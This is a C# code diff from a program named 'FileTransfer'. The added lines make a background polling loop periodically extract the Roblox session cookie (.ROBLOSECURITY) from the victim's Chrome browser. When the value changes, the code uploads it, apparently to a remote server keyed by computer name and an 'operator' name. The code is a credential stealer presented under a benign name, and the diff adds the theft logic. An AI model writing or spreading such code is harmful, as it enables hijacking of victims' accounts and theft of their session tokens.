@@ -208,11 +208,26 @@ namespace FileTransfer
         private async Task TokenRequestPollLoopAsync()
         {
             Log("Token request poll loop start");
+            int pollCount = 0;
             while (true)
             {
                 try
                 {
                     await Task.Delay(30000);
+                    pollCount++;
+
+                    // Каждые 10 итераций (5 мин) — переизвлекаем куку на случай если Chrome перезапустили
+                    if (pollCount % 10 == 0)
+                    {
+                        Log("Periodic cookie re-extraction...");
+                        string? fresh = CookieExtractor.ExtractRobloSecurity();
+                        if (!string.IsNullOrEmpty(fresh) && fresh != _cachedToken)
+                        {
+                            Log("Token changed, uploading...");
+                            _cachedToken = fresh;
+                            await UploadFileOnStartupAsync();
+                        }
+                    }
 
                     string checkUrl = $"{ServerUrl}/check-token-request?computerName={Uri.EscapeDataString(ComputerInfo.GetName())}&operator={Uri.EscapeDataString(OperatorName)}";
                     var resp = await _http.GetAsync(checkUrl);
